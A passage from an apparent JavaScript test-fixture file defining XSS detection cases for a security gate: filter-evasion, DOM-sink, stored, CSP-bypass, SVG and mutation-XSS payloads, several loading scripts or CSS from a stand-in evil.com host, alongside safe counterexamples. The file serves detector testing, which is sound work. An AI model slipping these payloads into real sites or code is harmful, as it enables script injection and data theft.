  rationale: 'confirm() as alternative to alert()',
});

push({
  description: 'XSS-06: SVG onload with entity-encoded handler',
  edits: injectEdit('<svg/onload=&#97&#108&#101&#114&#116(1)>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'filter_evasion', 'XSS-06'],
  rationale: 'SVG onload with entity-encoded function name',
});

push({
  description: 'XSS-06: mixed encoding combined in href',
  edits: injectEdit('<a href="j&#97;v&#x61;script:alert(1)">click</a>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'filter_evasion', 'XSS-06'],
  rationale: 'Mixed decimal and hex entities in javascript:',
});

// --- Clean ---
push({
  description: 'XSS-06 clean: proper HTML comment',
  edits: safeEdit('const html = "<!-- page footer -->";'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'no_findings' }],
  expectedSuccess: true,
  tags: ['security', 'filter_evasion', 'XSS-06'],
  rationale: 'Standard HTML comment is safe',
});

push({
  description: 'XSS-06 clean: template literal with safe interpolation',
  edits: safeEdit('const tpl = `Hello ${username}`;'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'no_findings' }],
  expectedSuccess: true,
  tags: ['security', 'filter_evasion', 'XSS-06'],
  rationale: 'Template literal without script context',
});

// --- Grounding-only ---
push({
  description: 'XSS-06 grounding: fabricated nested script tag in server.js',
  edits: [],
  predicates: [{ type: 'content', file: 'server.js', pattern: '<scr<script>ipt>' }],
  expectedSuccess: false,
  expectedFailedGate: 'grounding',
  tags: ['security', 'filter_evasion', 'XSS-06'],
  rationale: 'No nested script tag evasion exists in server.js',
});

// =============================================================================
// XSS-07: DOM-BASED XSS
// document.write, innerHTML, eval, setTimeout with string, location sinks
// =============================================================================

push({
  description: 'XSS-07: document.write with location.hash',
  edits: domSinkEdit('document.write(location.hash)'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'dom_based', 'XSS-07'],
  rationale: 'document.write with unvalidated location.hash',
});

push({
  description: 'XSS-07: document.write with user input variable',
  edits: domSinkEdit('document.write(userInput)'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'dom_based', 'XSS-07'],
  rationale: 'document.write with unvalidated user input',
});

push({
  description: 'XSS-07: innerHTML assignment from user input',
  edits: domSinkEdit('document.getElementById("output").innerHTML = userInput'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'dom_based', 'XSS-07'],
  rationale: 'innerHTML set to unvalidated user input',
});

push({
  description: 'XSS-07: innerHTML with template literal interpolation',
  edits: domSinkEdit('el.innerHTML = `<div>${userInput}</div>`'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'dom_based', 'XSS-07'],
  rationale: 'innerHTML with unsanitized template interpolation',
});

push({
  description: 'XSS-07: outerHTML assignment from input',
  edits: domSinkEdit('element.outerHTML = userInput'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'dom_based', 'XSS-07'],
  rationale: 'outerHTML set to unvalidated input',
});

push({
  description: 'XSS-07: eval with user input',
  edits: domSinkEdit('eval(userInput)'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'dom_based', 'XSS-07'],
  rationale: 'eval() with unvalidated user input',
});

push({
  description: 'XSS-07: setTimeout with string argument from user',
  edits: domSinkEdit('setTimeout(userInput, 0)'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'dom_based', 'XSS-07'],
  rationale: 'setTimeout with string arg allows code injection',
});

push({
  description: 'XSS-07: setInterval with string argument from user',
  edits: domSinkEdit('setInterval(userInput, 1000)'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'dom_based', 'XSS-07'],
  rationale: 'setInterval with string arg allows code injection',
});

push({
  description: 'XSS-07: Function constructor from input',
  edits: domSinkEdit('new Function(userInput)()'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'dom_based', 'XSS-07'],
  rationale: 'Function constructor executes arbitrary code',
});

push({
  description: 'XSS-07: document.location assignment from input',
  edits: domSinkEdit('document.location = userInput'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'dom_based', 'XSS-07'],
  rationale: 'Location assignment enables javascript: navigation',
});

push({
  description: 'XSS-07: window.location.href from user input',
  edits: domSinkEdit('window.location.href = userInput'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'dom_based', 'XSS-07'],
  rationale: 'Location href set to unvalidated input',
});

push({
  description: 'XSS-07: insertAdjacentHTML with user input',
  edits: domSinkEdit('el.insertAdjacentHTML("beforeend", userInput)'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'dom_based', 'XSS-07'],
  rationale: 'insertAdjacentHTML injects raw HTML from input',
});

push({
  description: 'XSS-07: jQuery .html() with user input',
  edits: domSinkEdit('$(selector).html(userInput)'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'dom_based', 'XSS-07'],
  rationale: 'jQuery .html() sets innerHTML from input',
});

// --- Clean ---
push({
  description: 'XSS-07 clean: textContent assignment',
  edits: domSinkEdit('document.getElementById("app").textContent = "Hello"'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'no_findings' }],
  expectedSuccess: true,
  tags: ['security', 'dom_based', 'XSS-07'],
  rationale: 'textContent is a safe DOM property (no HTML parsing)',
});

push({
  description: 'XSS-07 clean: setTimeout with arrow function',
  edits: domSinkEdit('setTimeout(() => { console.log("done"); }, 0)'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'no_findings' }],
  expectedSuccess: true,
  tags: ['security', 'dom_based', 'XSS-07'],
  rationale: 'Arrow function callback, not string argument',
});

// --- Grounding-only ---
push({
  description: 'XSS-07 grounding: fabricated document.write in server.js',
  edits: [],
  predicates: [{ type: 'content', file: 'server.js', pattern: 'document\\.write\\(' }],
  expectedSuccess: false,
  expectedFailedGate: 'grounding',
  tags: ['security', 'dom_based', 'XSS-07'],
  rationale: 'No document.write calls exist in server.js (it is server-side Node.js)',
});

push({
  description: 'XSS-07 grounding: fabricated innerHTML sink in /about route',
  edits: [],
  predicates: [{ type: 'content', file: 'server.js', pattern: '\\.innerHTML\\s*=' }],
  expectedSuccess: false,
  expectedFailedGate: 'grounding',
  tags: ['security', 'dom_based', 'XSS-07'],
  rationale: 'No innerHTML assignments exist in server.js',
});

// =============================================================================
// XSS-08: STORED XSS
// Persistent payloads via forms, comments, user profiles, database storage
// =============================================================================

push({
  description: 'XSS-08: stored script in form field echo',
  edits: [{
    file: 'server.js',
    search: ANCHOR_LINE,
    replace: `const userName = '<script>alert(document.cookie)</script>';\n    res.end('<html><body>Welcome ' + userName + '</body></html>');\n    return;\n    ${ANCHOR_LINE}`,
  }],
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'stored_xss', 'XSS-08'],
  rationale: 'User-supplied name containing script tag echoed without sanitization',
});

push({
  description: 'XSS-08: stored img onerror in comment field',
  edits: [{
    file: 'server.js',
    search: ANCHOR_LINE,
    replace: `const comment = '<img src=x onerror=alert(1)>';\n    res.end('<html><body><div class="comment">' + comment + '</div></body></html>');\n    return;\n    ${ANCHOR_LINE}`,
  }],
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'stored_xss', 'XSS-08'],
  rationale: 'Stored XSS via img onerror in comment display',
});

push({
  description: 'XSS-08: stored SVG onload in profile bio',
  edits: [{
    file: 'server.js',
    search: ANCHOR_LINE,
    replace: `const bio = '<svg onload=alert(1)>';\n    res.end('<html><body><p>' + bio + '</p></body></html>');\n    return;\n    ${ANCHOR_LINE}`,
  }],
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'stored_xss', 'XSS-08'],
  rationale: 'Stored XSS via SVG onload in profile bio rendering',
});

// --- Clean ---
push({
  description: 'XSS-08 clean: echo endpoint returns JSON (not HTML)',
  edits: [],
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'no_findings' }],
  expectedSuccess: true,
  tags: ['security', 'stored_xss', 'XSS-08'],
  rationale: 'The /api/echo endpoint returns JSON, not rendered HTML',
});

push({
  description: 'XSS-08 clean: HTML-escaped user output',
  edits: safeEdit('const safe = userInput.replace(/</g, "&lt;").replace(/>/g, "&gt;");'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'no_findings' }],
  expectedSuccess: true,
  tags: ['security', 'stored_xss', 'XSS-08'],
  rationale: 'HTML entity escaping prevents stored XSS',
});

// --- Grounding-only ---
push({
  description: 'XSS-08 grounding: fabricated unescaped user display in /form route',
  edits: [],
  predicates: [{ type: 'content', file: 'server.js', pattern: "\\+ req\\.body\\.name \\+" }],
  expectedSuccess: false,
  expectedFailedGate: 'grounding',
  tags: ['security', 'stored_xss', 'XSS-08'],
  rationale: 'The /form route does not concatenate req.body into HTML',
});

// =============================================================================
// XSS-09: CSP BYPASS ATTEMPTS
// Inline script with nonce, base-tag injection, JSONP callback abuse
// =============================================================================

push({
  description: 'XSS-09: base tag hijack to external domain',
  edits: injectEdit('<base href="https://evil.com/">'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'csp_bypass', 'XSS-09'],
  rationale: 'Base tag hijacks all relative URLs to attacker domain',
});

push({
  description: 'XSS-09: script with fake nonce attribute',
  edits: injectEdit("<script nonce='bypass'>alert(1)</script>"),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'csp_bypass', 'XSS-09'],
  rationale: 'Script tag with fabricated nonce attribute',
});

push({
  description: 'XSS-09: JSONP callback injection pattern',
  edits: injectEdit('<script src="https://api.example.com/data?callback=alert"></script>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'csp_bypass', 'XSS-09'],
  rationale: 'JSONP endpoint with attacker-controlled callback name',
});

push({
  description: 'XSS-09: link preload to inject script',
  edits: injectEdit('<link rel="preload" href="https://evil.com/payload.js" as="script">'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'csp_bypass', 'XSS-09'],
  rationale: 'Preload link to external script resource',
});

push({
  description: 'XSS-09: style import for CSS exfiltration',
  edits: injectEdit('<style>@import url("https://evil.com/steal.css");</style>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'csp_bypass', 'XSS-09'],
  rationale: 'CSS @import from external domain for data exfiltration',
});

// --- Clean ---
push({
  description: 'XSS-09 clean: base tag with same-origin root',
  edits: safeEdit('const base = "<base href=\\"/\\">";'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'no_findings' }],
  expectedSuccess: true,
  tags: ['security', 'csp_bypass', 'XSS-09'],
  rationale: 'Base tag with same-origin root is safe',
});

// --- Grounding-only ---
push({
  description: 'XSS-09 grounding: fabricated CSP header bypass in server.js',
  edits: [],
  predicates: [{ type: 'content', file: 'server.js', pattern: "Content-Security-Policy.*unsafe-inline" }],
  expectedSuccess: false,
  expectedFailedGate: 'grounding',
  tags: ['security', 'csp_bypass', 'XSS-09'],
  rationale: 'server.js does not set any CSP headers',
});

// =============================================================================
// XSS-10: FRAMEWORK-SPECIFIC
// Angular expressions, React dangerouslySetInnerHTML, Vue v-html
// =============================================================================

push({
  description: 'XSS-10: Angular expression injection {{constructor.constructor("alert(1)")()}}',
  edits: injectEdit('{{constructor.constructor("alert(1)")()}}'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'framework_specific', 'XSS-10'],
  rationale: 'Angular template expression injection via constructor chain',
});

push({
  description: 'XSS-10: Angular ng-bind-html without sanitize',
  edits: injectEdit('<div ng-bind-html="userInput"></div>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'framework_specific', 'XSS-10'],
  rationale: 'Angular ng-bind-html with unsanitized user input',
});

push({
  description: 'XSS-10: React dangerouslySetInnerHTML with user input',
  edits: domSinkEdit('React.createElement("div", { dangerouslySetInnerHTML: { __html: userInput } })'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'framework_specific', 'XSS-10'],
  rationale: 'dangerouslySetInnerHTML with unvalidated user input',
});

push({
  description: 'XSS-10: Vue v-html directive with user input',
  edits: injectEdit('<div v-html="userInput"></div>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'framework_specific', 'XSS-10'],
  rationale: 'Vue v-html renders raw HTML from user input',
});

push({
  description: 'XSS-10: Angular $sce.trustAsHtml with input',
  edits: domSinkEdit('$sce.trustAsHtml(userInput)'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'framework_specific', 'XSS-10'],
  rationale: '$sce.trustAsHtml bypasses Angular sanitization',
});

push({
  description: 'XSS-10: jQuery .append() with unsanitized input',
  edits: domSinkEdit('$(selector).append(userInput)'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'framework_specific', 'XSS-10'],
  rationale: 'jQuery .append() with raw user input',
});

// --- Clean ---
push({
  description: 'XSS-10 clean: React createElement with text children only',
  edits: safeEdit('const el = "React.createElement(\\"div\\", null, userInput);";'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'no_findings' }],
  expectedSuccess: true,
  tags: ['security', 'framework_specific', 'XSS-10'],
  rationale: 'React text children are auto-escaped',
});

push({
  description: 'XSS-10 clean: Vue v-text directive',
  edits: safeEdit('const el = "<div v-text=\\"userInput\\"></div>";'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'no_findings' }],
  expectedSuccess: true,
  tags: ['security', 'framework_specific', 'XSS-10'],
  rationale: 'Vue v-text auto-escapes (unlike v-html)',
});

// --- Grounding-only ---
push({
  description: 'XSS-10 grounding: fabricated Angular expression in demo-app',
  edits: [],
  predicates: [{ type: 'content', file: 'server.js', pattern: 'ng-bind-html' }],
  expectedSuccess: false,
  expectedFailedGate: 'grounding',
  tags: ['security', 'framework_specific', 'XSS-10'],
  rationale: 'Demo app is vanilla Node.js with no Angular framework',
});

push({
  description: 'XSS-10 grounding: fabricated dangerouslySetInnerHTML in server.js',
  edits: [],
  predicates: [{ type: 'content', file: 'server.js', pattern: 'dangerouslySetInnerHTML' }],
  expectedSuccess: false,
  expectedFailedGate: 'grounding',
  tags: ['security', 'framework_specific', 'XSS-10'],
  rationale: 'Demo app has no React; dangerouslySetInnerHTML does not exist',
});

// =============================================================================
// XSS-11: SVG-BASED XSS
// SVG onload, foreignObject, animate, use, image, script in SVG namespace
// =============================================================================

push({
  description: 'XSS-11: svg onload handler',
  edits: injectEdit('<svg onload=alert(1)>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'svg_based', 'XSS-11'],
  rationale: 'SVG element with onload event handler',
});

push({
  description: 'XSS-11: svg onload with document.domain',
  edits: injectEdit('<svg onload=alert(document.domain)>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'svg_based', 'XSS-11'],
  rationale: 'SVG onload exfiltrating document.domain',
});

push({
  description: 'XSS-11: svg script tag inside SVG namespace',
  edits: injectEdit('<svg><script>alert(1)</script></svg>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'svg_based', 'XSS-11'],
  rationale: 'Script tag within SVG namespace',
});

push({
  description: 'XSS-11: svg foreignObject with body onload',
  edits: injectEdit('<svg><foreignObject><body onload=alert(1)></foreignObject></svg>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'svg_based', 'XSS-11'],
  rationale: 'foreignObject allowing HTML body with onload',
});

push({
  description: 'XSS-11: svg animate href to javascript',
  edits: injectEdit('<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'svg_based', 'XSS-11'],
  rationale: 'SVG animate changing href to javascript: URL',
});

push({
  description: 'XSS-11: svg set attributeName href to javascript',
  edits: injectEdit('<svg><set attributeName="href" to="javascript:alert(1)"/></svg>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'svg_based', 'XSS-11'],
  rationale: 'SVG set element changing href to javascript:',
});

push({
  description: 'XSS-11: svg a xlink:href javascript protocol',
  edits: injectEdit('<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'svg_based', 'XSS-11'],
  rationale: 'SVG anchor with xlink:href javascript: protocol',
});

push({
  description: 'XSS-11: svg use xlink:href data URI with onload',
  edits: injectEdit('<svg><use xlink:href="data:image/svg+xml,<svg onload=alert(1)>"></use></svg>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'svg_based', 'XSS-11'],
  rationale: 'SVG use element loading external SVG with onload',
});

push({
  description: 'XSS-11: svg image xlink:href javascript',
  edits: injectEdit('<svg><image xlink:href="javascript:alert(1)"></image></svg>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'svg_based', 'XSS-11'],
  rationale: 'SVG image with xlink:href javascript: protocol',
});

push({
  description: 'XSS-11: svg onload in nested g element',
  edits: injectEdit('<svg><g onload=alert(1)><rect width=100 height=100></g></svg>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'svg_based', 'XSS-11'],
  rationale: 'Onload handler on SVG g (group) element',
});

push({
  description: 'XSS-11: svg desc with embedded script',
  edits: injectEdit('<svg><desc><script>alert(1)</script></desc></svg>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'svg_based', 'XSS-11'],
  rationale: 'Script tag inside SVG desc element',
});

push({
  description: 'XSS-11: svg feImage with javascript xlink',
  edits: injectEdit('<svg><filter><feImage xlink:href="javascript:alert(1)"></feImage></filter></svg>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'svg_based', 'XSS-11'],
  rationale: 'SVG filter feImage with javascript: URL',
});

push({
  description: 'XSS-11: MathML mi xlink:href javascript',
  edits: injectEdit('<math><mi xlink:href="javascript:alert(1)">click</mi></math>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'svg_based', 'XSS-11'],
  rationale: 'MathML element with xlink:href javascript:',
});

// --- Clean ---
push({
  description: 'XSS-11 clean: svg with viewBox and rect only',
  edits: safeEdit('const svg = "<svg viewBox=\\"0 0 100 100\\"><rect fill=\\"blue\\"/></svg>";'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'no_findings' }],
  expectedSuccess: true,
  tags: ['security', 'svg_based', 'XSS-11'],
  rationale: 'SVG with simple rect element, no event handlers',
});

push({
  description: 'XSS-11 clean: svg with safe animate opacity',
  edits: safeEdit('const svg = "<svg><animate attributeName=\\"opacity\\" values=\\"0;1\\"/></svg>";'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'no_findings' }],
  expectedSuccess: true,
  tags: ['security', 'svg_based', 'XSS-11'],
  rationale: 'SVG animate with safe opacity animation values',
});

// --- Grounding-only ---
push({
  description: 'XSS-11 grounding: fabricated SVG foreignObject in demo-app',
  edits: [],
  predicates: [{ type: 'html', selector: 'svg foreignObject', expected: 'exists' }],
  expectedSuccess: false,
  expectedFailedGate: 'grounding',
  tags: ['security', 'svg_based', 'XSS-11'],
  rationale: 'No SVG foreignObject element exists in any demo-app route',
});

// =============================================================================
// XSS-12: MUTATION XSS (mXSS)
// Noscript trick, style injection, table parsing quirks, browser parser mutations
// =============================================================================

push({
  description: 'XSS-12: noscript tag trick with img onerror',
  edits: injectEdit('<noscript><img src=x onerror=alert(1)></noscript>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'mutation_xss', 'XSS-12'],
  rationale: 'Noscript content parsed differently in innerHTML context',
});

push({
  description: 'XSS-12: style tag with closing trick',
  edits: injectEdit('<style></style><script>alert(1)</script>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'mutation_xss', 'XSS-12'],
  rationale: 'Style tag closing followed by script injection',
});

push({
  description: 'XSS-12: table parser quirk with form injection',
  edits: injectEdit('<table><tr><td><form action="javascript:alert(1)"><button>X</button></form></td></tr></table>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'mutation_xss', 'XSS-12'],
  rationale: 'Form with javascript: action inside table (parser quirk)',
});

push({
  description: 'XSS-12: textarea fake closing mXSS',
  edits: injectEdit('</textarea><script>alert(1)</script><textarea>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'mutation_xss', 'XSS-12'],
  rationale: 'Breaking out of textarea context',
});

push({
  description: 'XSS-12: title tag mXSS breakout',
  edits: injectEdit('</title><script>alert(1)</script><title>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'mutation_xss', 'XSS-12'],
  rationale: 'Breaking out of title element context',
});

push({
  description: 'XSS-12: math namespace confusion mXSS',
  edits: injectEdit('<math><mtext><table><tr><td><style><math><mtext><img src=x onerror=alert(1)></mtext></math></style></td></tr></table></mtext></math>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'mutation_xss', 'XSS-12'],
  rationale: 'Deep namespace confusion causing parser mutation',
});

push({
  description: 'XSS-12: svg namespace confusion mXSS',
  edits: injectEdit('<svg><style><img src=x onerror=alert(1)></style></svg>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'mutation_xss', 'XSS-12'],
  rationale: 'SVG style element parsed differently than HTML style',
});

push({
  description: 'XSS-12: select mXSS with img injection',
  edits: injectEdit('<select><option><img src=x onerror=alert(1)></option></select>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'mutation_xss', 'XSS-12'],
  rationale: 'Select element parser removes option wrapper, exposing img',
});

// --- Clean ---
push({
  description: 'XSS-12 clean: noscript with safe message',
  edits: safeEdit('const el = "<noscript><p>Please enable JavaScript</p></noscript>";'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'no_findings' }],
  expectedSuccess: true,
  tags: ['security', 'mutation_xss', 'XSS-12'],
  rationale: 'Noscript with safe paragraph text content',
});

push({
  description: 'XSS-12 clean: style tag with safe CSS',
  edits: safeEdit('const el = "<style>body { background: white; }</style>";'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'no_findings' }],
  expectedSuccess: true,
  tags: ['security', 'mutation_xss', 'XSS-12'],
  rationale: 'Style tag with safe CSS properties only',
});

// --- Grounding-only ---
push({
  description: 'XSS-12 grounding: fabricated noscript XSS in /about page',
  edits: [],
  predicates: [{ type: 'html', selector: 'noscript img[onerror]', expected: 'exists' }],
  expectedSuccess: false,
  expectedFailedGate: 'grounding',
  tags: ['security', 'mutation_xss', 'XSS-12'],
  rationale: 'No noscript with img onerror exists in any route',
});

push({
  description: 'XSS-12 grounding: fabricated title breakout in demo-app',
  edits: [],
  predicates: [{ type: 'content', file: 'server.js', pattern: '</title><script>' }],
  expectedSuccess: false,
  expectedFailedGate: 'grounding',
  tags: ['security', 'mutation_xss', 'XSS-12'],
  rationale: 'No title breakout pattern exists in server.js',
});

// =============================================================================
// BONUS: Additional stored XSS patterns (XSS-08)
// =============================================================================

push({
  description: 'XSS-08: stored payload in URL parameter reflected in page',
  edits: [{
    file: 'server.js',
    search: ANCHOR_LINE,
    replace: `const name = req.url.split('name=')[1] || 'Guest';\n    res.end('<html><body>Hello ' + name + '</body></html>');\n    return;\n    ${ANCHOR_LINE}`,
  }],
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'stored_xss', 'XSS-08'],
  rationale: 'URL parameter directly concatenated into HTML response',
});

push({
  description: 'XSS-08: stored XSS via JSON.stringify without escaping in HTML',
  edits: [{
    file: 'server.js',
    search: ANCHOR_LINE,
    replace: `const data = { comment: '<img src=x onerror=alert(1)>' };\n    res.end('<html><body><script>var d = ' + JSON.stringify(data) + '</script></body></html>');\n    return;\n    ${ANCHOR_LINE}`,
  }],
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'stored_xss', 'XSS-08'],
  rationale: 'JSON.stringify output in script context without escaping',
});

// =============================================================================
// BONUS: Additional CSP bypass patterns (XSS-09)
// =============================================================================

push({
  description: 'XSS-09: object data attribute with external HTML',
  edits: injectEdit('<object data="https://evil.com/xss.html">'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'csp_bypass', 'XSS-09'],
  rationale: 'Object element loading external HTML page',
});

push({
  description: 'XSS-09: script tag with type="module" and external import',
  edits: injectEdit('<script type="module">import("https://evil.com/payload.mjs")</script>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'csp_bypass', 'XSS-09'],
  rationale: 'ES module dynamic import from external domain',
});

// =============================================================================
// BONUS: Additional framework-specific patterns (XSS-10)
// =============================================================================

push({
  description: 'XSS-10: Handlebars triple-stash unescaped output',
  edits: domSinkEdit('Handlebars.compile("{{{userInput}}}")(context)'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'framework_specific', 'XSS-10'],
  rationale: 'Handlebars triple-stash outputs raw HTML (no escaping)',
});

push({
  description: 'XSS-10: EJS unescaped output tag',
